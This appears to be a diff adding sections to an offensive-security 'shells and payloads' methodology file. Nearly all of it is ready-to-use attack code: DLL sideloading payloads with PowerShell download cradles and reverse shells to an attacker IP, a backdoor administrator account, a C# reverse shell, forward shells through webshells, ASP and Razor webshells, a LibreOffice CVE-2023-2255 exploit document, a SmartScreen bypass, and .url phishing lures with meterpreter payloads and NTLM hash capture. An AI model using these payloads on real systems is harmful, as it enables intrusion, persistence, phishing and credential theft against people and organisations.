@@ -228,6 +228,188 @@ socat -d -d TCP-LISTEN:4444,reuseaddr,fork FILE:`tty`,raw,echo=0
 pwncat-cs -lp 4444
 ```
 
+### Custom Windows DLL with Named Exports (mingw Cross-Compile)
+
+When a PoC or DLL hijack requires a specific exported function name (not just DllMain), build a custom DLL with `__declspec(dllexport)` targeting that symbol. Useful for DLL sideloading where the legitimate DLL exports `ServiceMain`, `DllGetClassObject`, `InitHelperDll`, etc.
+
+```bash
+# Attacker Linux — create DLL source with custom named export
+cat << 'EOF' > payload.c
+#include <windows.h>
+#include <stdlib.h>
+
+// Exported function matching what the vulnerable app calls via GetProcAddress
+__declspec(dllexport) void <EXPORT_NAME>(void) {
+    system("cmd.exe /c powershell -nop -w hidden -c \"IEX((New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/p.ps1'))\"");
+}
+
+// DllMain — executes on DLL load regardless of which export is called
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        system("cmd.exe /c powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('<ATTACKER_IP>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sbb=([text.encoding]::ASCII).GetBytes($sb);$s.Write($sbb,0,$sbb.Length);$s.Flush()};$c.Close()\"");
+    }
+    return TRUE;
+}
+EOF
+```
+
+```bash
+# Cross-compile DLL with mingw (x64)
+x86_64-w64-mingw32-gcc -shared -o <OUTPUT_DLL>.dll payload.c -lws2_32
+
+# Cross-compile DLL (x86 / WoW64 targets)
+i686-w64-mingw32-gcc -shared -o <OUTPUT_DLL>.dll payload.c -lws2_32
+
+# Verify exports
+x86_64-w64-mingw32-objdump -p <OUTPUT_DLL>.dll | grep -A 50 "Export Table"
+# Or with wine + dumpbin equivalent:
+winedump -j export <OUTPUT_DLL>.dll
+```
+
+```bash
+# Multiple named exports (some apps call multiple functions on load)
+cat << 'EOF' > multi_export.c
+#include <windows.h>
+
+void run_payload(void) {
+    WinExec("cmd.exe /c net user backdoor P@ss123! /add && net localgroup Administrators backdoor /add", 0);
+}
+
+__declspec(dllexport) void <EXPORT_NAME1>(void) { run_payload(); }
+__declspec(dllexport) void <EXPORT_NAME2>(void) { run_payload(); }
+__declspec(dllexport) int <EXPORT_NAME3>(int a, int b) { run_payload(); return 0; }
+
+BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID l) { return TRUE; }
+EOF
+
+x86_64-w64-mingw32-gcc -shared -o hijack.dll multi_export.c
+```
+
+```bash
+# DEF file approach (explicit ordinal control — needed when app imports by ordinal)
+cat << 'EOF' > exports.def
+LIBRARY "hijack"
+EXPORTS
+    <EXPORT_NAME1> @1
+    <EXPORT_NAME2> @2
+    DllRegisterServer @3 PRIVATE
+EOF
+
+x86_64-w64-mingw32-gcc -shared -o hijack.dll payload.c exports.def -lws2_32
+```
+
+#### Living-off-the-land / LOTL variant
+
+On a Windows target with Visual Studio Build Tools or .NET SDK installed:
+
+```cmd
+REM On-target compilation with cl.exe (Visual Studio Developer Command Prompt)
+cl.exe /LD /Fe:<OUTPUT_DLL>.dll payload.c ws2_32.lib
+```
+
+```powershell
+# On-target via Add-Type (C# DLL with exports via DllExport NuGet pattern)
+# Limited: C# DLLs don't natively support unmanaged exports without DllExport/UnmanagedExports
+# Fallback: compile C code if mingw is on target
+& "C:\msys64\mingw64\bin\gcc.exe" -shared -o C:\Temp\hijack.dll C:\Temp\payload.c
+```
+
+### Cross-Compile C# Windows EXE from Linux (Mono mcs)
+
+Build Windows-targeted C# executables from a Linux attack box without .NET SDK or Visual Studio. Mono's `mcs` compiler produces valid .NET assemblies that run on any Windows host with .NET Framework installed.
+
+```bash
+# Basic reverse shell EXE — compile on Linux, runs on Windows
+cat << 'EOF' > revshell.cs
+using System;
+using System.Net.Sockets;
+using System.Diagnostics;
+using System.IO;
+
+class Program {
+    static void Main() {
+        using (TcpClient c = new TcpClient("<ATTACKER_IP>", 4444))
+        using (Stream s = c.GetStream()) {
+            byte[] buf = new byte[65536];
+            Process p = new Process();
+            p.StartInfo.FileName = "cmd.exe";
+            p.StartInfo.RedirectStandardInput = true;
+            p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.RedirectStandardError = true;
+            p.StartInfo.UseShellExecute = false;
+            p.Start();
+            using (StreamWriter sw = p.StandardInput)
+            using (StreamReader sr = p.StandardOutput)
+            using (StreamReader se = p.StandardError) {
+                while (true) {
+                    int bytes = s.Read(buf, 0, buf.Length);
+                    if (bytes == 0) break;
+                    string cmd = System.Text.Encoding.ASCII.GetString(buf, 0, bytes);
+                    sw.WriteLine(cmd);
+                    sw.Flush();
+                    System.Threading.Thread.Sleep(500);
+                    string output = sr.ReadToEnd() + se.ReadToEnd();
+                    byte[] outBytes = System.Text.Encoding.ASCII.GetBytes(output);
+                    s.Write(outBytes, 0, outBytes.Length);
+                }
+            }
+        }
+    }
+}
+EOF
+
+# Compile with mono mcs — produces Windows .exe
+mcs -target:winexe -out:revshell.exe revshell.cs -r:System.dll
+
+# Verify it's a valid .NET PE
+monodis --assembly revshell.exe
+file revshell.exe   # should show "PE32 executable (GUI) Intel 80386 Mono/.Net assembly"
+```
+
+```bash
+# Compile with specific SDK version (target older .NET Framework)
+mcs -sdk:2 -target:exe -out:payload.exe source.cs              # .NET 2.0
+mcs -sdk:4 -target:exe -out:payload.exe source.cs              # .NET 4.0
+mcs -sdk:4.5 -target:exe -out:payload.exe source.cs            # .NET 4.5
+
+# Reference additional assemblies
+mcs -target:winexe -out:payload.exe source.cs \
+  -r:System.dll -r:System.Net.dll -r:System.IO.dll -r:System.Management.dll
+
+# Compile DLL (class library) for reflective load
+mcs -target:library -out:payload.dll source.cs -r:System.dll
+```
+
+```bash
+# Simple command executor (useful for quick PoC compilation)
+cat << 'EOF' > runcmd.cs
+using System;
+using System.Diagnostics;
+class R {
+    static void Main(string[] args) {
+        if (args.Length < 1) return;
+        Process.Start(new ProcessStartInfo("cmd.exe", "/c " + String.Join(" ", args))
+        { UseShellExecute = false, RedirectStandardOutput = true })
+        .StandardOutput.ReadToEnd();
+    }
+}
+EOF
+mcs -target:exe -out:runcmd.exe runcmd.cs -r:System.dll
+```
+
+#### Living-off-the-land / LOTL variant
+
+If already on a Windows target with .NET Framework (nearly all Windows hosts), use the built-in `csc.exe` compiler:
+
+```cmd
+REM Find csc.exe on target (always present with .NET Framework)
+dir /s /b C:\Windows\Microsoft.NET\Framework64\*csc.exe
+REM Typically: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
+
+REM Compile on-target
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:exe /out:C:\Temp\payload.exe C:\Temp\source.cs
+```
+
 [^ top](#shells-and-payloads-methodology)
 
 ---
@@ -344,6 +526,81 @@ powershell -c "iwr http://<ATTACKER_IP>/p.exe -OutFile C:\Windows\Temp\p.exe"
 
 # curl (Windows 10 1803+)
 curl http://<ATTACKER_IP>/p.exe -o C:\Windows\Temp\p.exe
+```
+
+### Forward Shell (Egress-Blocked Environments)
+
+When the target blocks all outbound connections (no reverse shell possible) and inbound ports are filtered (no bind shell), a forward shell polls commands through an existing webshell using named pipes. The attacker drives the interaction from their box; the target never initiates a connection.
+
+```bash
+# Attacker side — forward shell client (Python3 script)
+# Requires an existing webshell that accepts commands (e.g., shell.php?c=)
+# Create this as fwdsh.py on attacker box:
+cat << 'FWDEOF' > fwdsh.py
+#!/usr/bin/env python3
+import requests, threading, time, sys, urllib.parse
+URL = sys.argv[1]       # http://<TARGET>/shell.php?c=
+STDIN  = "/dev/shm/.fwd_in"
+STDOUT = "/dev/shm/.fwd_out"
+
+# Setup named pipes on target via webshell
+setup = f"rm -f {STDIN} {STDOUT}; mkfifo {STDIN}; mkfifo {STDOUT}; cat {STDIN} | /bin/sh -i 2>&1 > {STDOUT} &"
+requests.get(URL + urllib.parse.quote(setup))
+time.sleep(1)
+
+def read_output():
+    while True:
+        r = requests.get(URL + urllib.parse.quote(f"cat {STDOUT}"), timeout=5)
+        if r.text.strip():
+            print(r.text, end="", flush=True)
+        time.sleep(0.3)
+
+t = threading.Thread(target=read_output, daemon=True)
+t.start()
+
+while True:
+    cmd = input()
+    requests.get(URL + urllib.parse.quote(f"echo '{cmd}' > {STDIN}"))
+FWDEOF
+chmod +x fwdsh.py
+```
+
+```bash
+# Usage — point at your webshell's command parameter
+python3 fwdsh.py "http://<TARGET>/shell.php?c="
+```
+
+```bash
+# Manual forward shell via curl (no script needed, slower but works anywhere)
+# Step 1: setup pipes on target through the webshell
+curl -s "http://<TARGET>/shell.php?c=$(python3 -c 'import urllib.parse;print(urllib.parse.quote("rm -f /dev/shm/.i /dev/shm/.o; mkfifo /dev/shm/.i; mkfifo /dev/shm/.o; cat /dev/shm/.i | /bin/sh -i 2>&1 > /dev/shm/.o &"))')"
+
+# Step 2: send commands (repeat for each command)
+curl -s "http://<TARGET>/shell.php?c=$(python3 -c 'import urllib.parse;print(urllib.parse.quote("echo id > /dev/shm/.i"))')"
+
+# Step 3: read output
+curl -s "http://<TARGET>/shell.php?c=$(python3 -c 'import urllib.parse;print(urllib.parse.quote("cat /dev/shm/.o"))')"
+```
+
+#### Living-off-the-land / LOTL variant
+
+The forward shell concept is inherently LOTL on the target side (mkfifo + sh are POSIX builtins). The attacker side only needs curl or any HTTP client:
+
+```bash
+# Pure bash attacker-side loop (no python3 required on attacker)
+WEBSHELL="http://<TARGET>/shell.php?c="
+FIFO_IN="/dev/shm/.i"
+FIFO_OUT="/dev/shm/.o"
+
+# Setup
+curl -s "${WEBSHELL}$(printf '%s' "rm -f $FIFO_IN $FIFO_OUT;mkfifo $FIFO_IN;mkfifo $FIFO_OUT;cat $FIFO_IN|/bin/sh -i 2>&1>$FIFO_OUT &" | jq -sRr @uri)" > /dev/null
+
+# Interactive loop
+while IFS= read -rp "fwd> " cmd; do
+  curl -s "${WEBSHELL}$(printf '%s' "echo '$cmd' > $FIFO_IN" | jq -sRr @uri)" > /dev/null
+  sleep 0.5
+  curl -s "${WEBSHELL}$(printf '%s' "cat $FIFO_OUT" | jq -sRr @uri)"
+done
 ```
 
 ### Squiblydoo / Living-Off-The-Land Execution
@@ -661,6 +918,57 @@ Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>");
 %>
 ```
 
+### Classic ASP (VBScript) — IIS Legacy Servers
+
+Classic ASP (.asp) runs VBScript server-side on IIS. Common on legacy Windows Server 2003/2008 hosts and older intranet applications. When user input is reflected into ASP execution context or you can upload .asp files, WScript.Shell provides command execution.
+
+```asp
+<%
+' Minimal classic ASP webshell — cmd exec via WScript.Shell
+Dim cmd, obj, output
+cmd = Request("c")
+If cmd <> "" Then
+  Set obj = CreateObject("WScript.Shell")
+  Set output = obj.Exec("cmd.exe /c " & cmd)
+  Response.Write("<pre>" & output.StdOut.ReadAll & "</pre>")
+End If
+%>
+```
+
+```asp
+<%
+' Reverse shell trigger — calls pre-staged payload or PowerShell
+Dim obj
+Set obj = CreateObject("WScript.Shell")
+obj.Run "powershell -nop -w hidden -c ""$c=New-Object Net.Sockets.TCPClient('<ATTACKER_IP>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sbb=([text.encoding]::ASCII).GetBytes($sb);$s.Write($sbb,0,$sbb.Length);$s.Flush()};$c.Close()""", 0, False
+%>
+```
+
+```bash
+# Trigger webshell
+curl "http://<TARGET>/shell.asp?c=whoami"
+
+# Code injection into vulnerable ASP page (input reflected into Eval/Execute)
+# If target has: <% Execute(Request("code")) %>
+curl "http://<TARGET>/vuln.asp" --data-urlencode 'code=Set s=CreateObject("WScript.Shell"):Set r=s.Exec("cmd /c whoami"):Response.Write(r.StdOut.ReadAll)'
+```
+
+#### Living-off-the-land / LOTL variant
+
+Classic ASP is itself LOTL on any IIS host with ASP enabled (default on legacy servers). No tools to install; WScript.Shell and Scripting.FileSystemObject are built-in COM objects:
+
+```asp
+<%
+' File write via built-in FileSystemObject (stage next payload without upload vuln)
+Dim fso, f
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set f = fso.CreateTextFile("C:\inetpub\wwwroot\cmd.asp", True)
+f.Write "<%Set o=CreateObject(""WScript.Shell""):Set r=o.Exec(""cmd /c ""&Request(""c"")):Response.Write(r.StdOut.ReadAll)%>"
+f.Close
+Response.Write("Dropped cmd.asp")
+%>
+```
+
 ### JSP — minimal
 
 ```jsp
@@ -714,6 +1022,69 @@ weevely http://<TARGET_IP>/weevely.php <PASSWORD>
 | **Behinder** | Multi (encrypted dynamic) | Chinese, in-memory, very evasive |
 | **Godzilla** | Multi (encrypted dynamic) | Successor to Behinder, AES+base64 |
 | **chopper / china chopper** | ASP/PHP | Tiny one-liner, GUI client |
+
+### Razor Class Library DLL — Upload-to-RCE in Blazor/ASP.NET Core
+
+When a Blazor Server or ASP.NET Core app allows file upload into a path that gets loaded as a Razor component (e.g., path traversal into `Pages/` or a plugin directory), a malicious Razor Class Library DLL achieves RCE without traditional webshell detection.
+
+```bash
+# On attacker Linux box — create malicious Razor Class Library
+mkdir -p /tmp/razorpwn && cd /tmp/razorpwn
+dotnet new razorclasslib -n MalLib --no-https
+cd MalLib
+
+# Replace default component with RCE component
+cat > Component1.razor << 'EOF'
+@page "/pwn"
+@using System.Diagnostics
+
+<h3>@output</h3>
+
+@code {
+    [Parameter]
+    [SupplyParameterFromQuery(Name = "c")]
+    public string Cmd { get; set; }
+    private string output;
+    protected override void OnInitialized()
+    {
+        if (!string.IsNullOrEmpty(Cmd))
+        {
+            var psi = new ProcessStartInfo("/bin/sh", $"-c \"{Cmd}\"")
+            { RedirectStandardOutput = true, UseShellExecute = false };
+            var p = Process.Start(psi);
+            output = p.StandardOutput.ReadToEnd();
+        }
+    }
+}
+EOF
+
+# Build the DLL
+dotnet build -c Release
+# Output: bin/Release/net8.0/MalLib.dll (adjust TFM to match target)
+```
+
+```bash
+# Upload via path traversal to target's component scan directory
+curl -F "file=@bin/Release/net8.0/MalLib.dll;filename=../Pages/MalLib.dll" http://<TARGET>/upload
+
+# Trigger (if hot-reload or app restart picks up the DLL)
+curl "http://<TARGET>/pwn?c=id"
+```
+
+#### Living-off-the-land / LOTL variant
+
+On a Windows target with .NET SDK already installed (dev servers, build agents):
+
+```powershell
+# Create and build entirely on-target (LOTL — no file transfer of DLL needed)
+mkdir C:\Temp\mal && cd C:\Temp\mal
+dotnet new razorclasslib -n Pwn --no-https
+# Then write the malicious .razor file via echo/Out-File and build with dotnet build
+# Copy resulting DLL to the app's assembly probe path
+copy bin\Release\net8.0\Pwn.dll C:\inetpub\wwwroot\bin\Pwn.dll
+```
+
+> **Note:** Requires the target to restart or use hot-reload. If the app uses `AddAdditionalAssemblies()`, the DLL is picked up on next request. Otherwise, trigger an app pool recycle: `cmd /c iisreset` (requires admin) or wait for idle timeout.
 
 [^ top](#shells-and-payloads-methodology)
 
@@ -820,6 +1191,220 @@ python3 PackMyPayload.py payload.exe out.iso
 - Embed `.hta`, `.bat`, `.cmd`, `.vbs`, `.js`, `.ps1` in OneNote section
 - Lure to "click to open" — runs attachment via shell association
 - Mitigated in current Office; still effective on unpatched / pre-2023 builds
+
+### CVE-2023-2255 — LibreOffice Macro-less RCE via Floating Frame
+
+LibreOffice <= 7.4.7 / 7.5.3 loads external content from IFrame/floating-frame elements in .odt/.odp files without any user prompt. Achieves code execution without macros enabled by pointing the frame at an attacker-hosted file that triggers a handler (e.g., .jar, .bat via file:// or SMB UNC).
+
+```bash
+# Create malicious .odt on attacker Linux box
+mkdir -p /tmp/odt_exploit && cd /tmp/odt_exploit
+
+# Create content.xml with floating frame pointing at attacker
+cat << 'EOF' > content.xml
+<?xml version="1.0" encoding="UTF-8"?>
+<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
+  xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"
+  xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0"
+  xmlns:xlink="http://www.w3.org/1999/xlink"
+  xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0"
+  office:version="1.3">
+<office:body><office:text>
+<text:p>Loading...</text:p>
+<draw:frame draw:name="pwn" svg:width="0.1cm" svg:height="0.1cm" text:anchor-type="char">
+  <draw:floating-frame xlink:href="http://<ATTACKER_IP>:<ATTACKER_PORT>/payload" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
+</draw:frame>
+</office:text></office:body>
+</office:document-content>
+EOF
+
+# Minimal META-INF/manifest.xml
+mkdir -p META-INF
+cat << 'EOF' > META-INF/manifest.xml
+<?xml version="1.0" encoding="UTF-8"?>
+<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.3">
+ <manifest:file-entry manifest:full-path="/" manifest:version="1.3" manifest:media-type="application/vnd.oasis.opendocument.text"/>
+ <manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>
+</manifest:manifest>
+EOF
+
+# Create mimetype file (must be first in ZIP, uncompressed)
+echo -n "application/vnd.oasis.opendocument.text" > mimetype
+
+# Package as .odt (ZIP with mimetype first, stored not deflated)
+zip -0 -X exploit.odt mimetype
+zip -r exploit.odt content.xml META-INF/
+```
+
+```bash
+# Attacker — host payload (e.g., respond with .bat content or redirect to SMB for hash capture)
+# For RCE: serve a file that the OS will execute via handler association
+python3 -m http.server <ATTACKER_PORT>
+
+# For NTLM hash theft variant: point floating-frame at \\<ATTACKER_IP>\share\doc
+# Then catch with responder/impacket-smbserver
+impacket-smbserver share /tmp/share -smb2support
+```
+
+#### Living-off-the-land / LOTL variant
+
+The .odt can be crafted entirely with LOTL tools (mkdir, echo, zip are standard). On Windows target, if you need to create the lure locally:
+
+```powershell
+# PowerShell — create .odt lure without LibreOffice installed
+$content = @'
+<?xml version="1.0" encoding="UTF-8"?>
+<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0" office:version="1.3"><office:body><office:text><text:p>Review</text:p><draw:frame draw:name="f" svg:width="0.1cm" svg:height="0.1cm" text:anchor-type="char"><draw:floating-frame xlink:href="\\<ATTACKER_IP>\share\payload" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></office:text></office:body></office:document-content>
+'@
+# Build ZIP manually with .NET compression classes
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+$zip = [System.IO.Compression.ZipFile]::Open("C:\Temp\lure.odt","Create")
+$entry = $zip.CreateEntry("mimetype",[System.IO.Compression.CompressionLevel]::NoCompression)
+$sw = New-Object System.IO.StreamWriter($entry.Open()); $sw.Write("application/vnd.oasis.opendocument.text"); $sw.Dispose()
+$entry2 = $zip.CreateEntry("content.xml")
+$sw2 = New-Object System.IO.StreamWriter($entry2.Open()); $sw2.Write($content); $sw2.Dispose()
+$zip.Dispose()
+```
+
+> **Scope:** Affects LibreOffice <= 7.4.7 and <= 7.5.3. Patched in 7.4.8 / 7.5.4+. Check target version before using.
+
+### CVE-2023-36025 — SmartScreen Bypass via .url in ZIP
+
+Windows SmartScreen (MOTW enforcement) can be bypassed on unpatched Windows 10/11 by embedding a .url Internet Shortcut file inside a ZIP archive. When the user extracts and clicks the .url file, SmartScreen does not display the usual warning dialog, allowing execution of the referenced payload without the MOTW block.
+
+```bash
+# Step 1: Generate payload and host on SMB or WebDAV
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 -f exe -o payload.exe
+
+# Host on attacker SMB share
+impacket-smbserver share /tmp/payloads -smb2support
+# Or host via WebDAV (wsgidav)
+# wsgidav --host 0.0.0.0 --port 80 --root /tmp/payloads --auth anonymous
+```
+
+```bash
+# Step 2: Create .url file pointing at the payload on attacker share
+cat << 'EOF' > report.url
+[InternetShortcut]
+URL=file://<ATTACKER_IP>/share/payload.exe
+IconIndex=0
+IconFile=C:\Windows\System32\shell32.dll
+EOF
+```
+
+```bash
+# Step 3: Package into ZIP (the ZIP container strips MOTW from extracted contents on older builds)
+zip -j lure.zip report.url
+
+# Deliver lure.zip via phishing email, web download, or file share
+```
+
+```bash
+# Alternative: reference a WebDAV-hosted payload (for environments blocking SMB outbound)
+cat << 'EOF' > invoice.url
+[InternetShortcut]
+URL=http://<ATTACKER_IP>/payload.exe
+IconIndex=70
+IconFile=C:\Windows\System32\shell32.dll
+EOF
+zip -j invoice.zip invoice.url
+```
+
+#### Living-off-the-land / LOTL variant
+
+Create the .url and ZIP entirely with built-in Windows tools (no Python/msfvenom on target):
+
+```powershell
+# Create .url lure on Windows
+Set-Content -Path "C:\Temp\report.url" -Value @"
+[InternetShortcut]
+URL=file://<ATTACKER_IP>/share/payload.exe
+IconIndex=0
+IconFile=C:\Windows\System32\shell32.dll
+"@
+
+# ZIP using built-in Compress-Archive
+Compress-Archive -Path "C:\Temp\report.url" -DestinationPath "C:\Temp\lure.zip"
+```
+
+> **Scope:** Affects unpatched Windows before November 2023 patch (KB5032189/KB5032190). Modern fully-patched Windows enforces SmartScreen on .url regardless of container.
+
+### .url Internet Shortcut — Click-to-Exec via SMB UNC
+
+A .url file with `URL=` pointing at an executable on an attacker SMB share provides one-click code execution. Unlike the NTLM-hash-coercion technique (which uses `IconFile=` to force an authentication attempt on icon load), this variant uses the `URL=` field to execute a binary when the user double-clicks the shortcut.
+
+```bash
+# Step 1: Generate payload
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 -f exe -o payload.exe
+
+# Step 2: Host on SMB share (impacket)
+mkdir /tmp/share && cp payload.exe /tmp/share/
+impacket-smbserver share /tmp/share -smb2support
+```
+
+```bash
+# Step 3: Create .url lure pointing URL= at the executable
+cat << 'EOF' > Q3-Report.url
+[InternetShortcut]
+URL=file://<ATTACKER_IP>/share/payload.exe
+WorkingDirectory=C:\Windows\System32
+IconIndex=1
+IconFile=C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
+HotKey=0
+EOF
+```
+
+```bash
+# Step 4: Deliver via email attachment, file share drop, or web download
+# For additional stealth, combine with ZIP container to strip MOTW (see CVE-2023-36025 above)
+zip -j Q3-Report.zip Q3-Report.url
+```
+
+```bash
+# Variant: .url pointing at WebDAV path (when SMB 445 is blocked outbound)
+cat << 'EOF' > Expenses.url
+[InternetShortcut]
+URL=http://<ATTACKER_IP>/payload.exe
+IconIndex=1
+IconFile=C:\Windows\System32\shell32.dll
+EOF
+```
+
+```bash
+# Variant: combine with NTLM coercion (IconFile for hash, URL for exec — double-tap)
+cat << 'EOF' > Payroll.url
+[InternetShortcut]
+URL=file://<ATTACKER_IP>/share/payload.exe
+IconIndex=0
+IconFile=\\<ATTACKER_IP>\icons\excel.ico
+EOF
+# IconFile triggers NTLM auth on icon render (even without click) — catch with Responder
+# URL triggers execution on double-click — catch with multi/handler
+```
+
+#### Living-off-the-land / LOTL variant
+
+Create .url files with only built-in Windows commands (no PowerShell required):
+
+```cmd
+REM Create .url from cmd.exe (echo to file)
+echo [InternetShortcut] > C:\Temp\Report.url
+echo URL=file://<ATTACKER_IP>/share/payload.exe >> C:\Temp\Report.url
+echo IconIndex=1 >> C:\Temp\Report.url
+echo IconFile=C:\Windows\System32\shell32.dll >> C:\Temp\Report.url
+```
+
+```powershell
+# PowerShell variant with Out-File
+@"
+[InternetShortcut]
+URL=file://<ATTACKER_IP>/share/payload.exe
+IconIndex=1
+IconFile=C:\Windows\System32\shell32.dll
+"@ | Out-File -Encoding ascii C:\Temp\Report.url
+```
+
+> **Note:** Distinguish from the NTLM hash coercion .url technique (documented in active-directory-methodology.md) which uses `IconFile=\\attacker\share` for authentication relay. This technique uses `URL=` for direct code execution on user click.
 
 ### Macro-enabled Documents
 
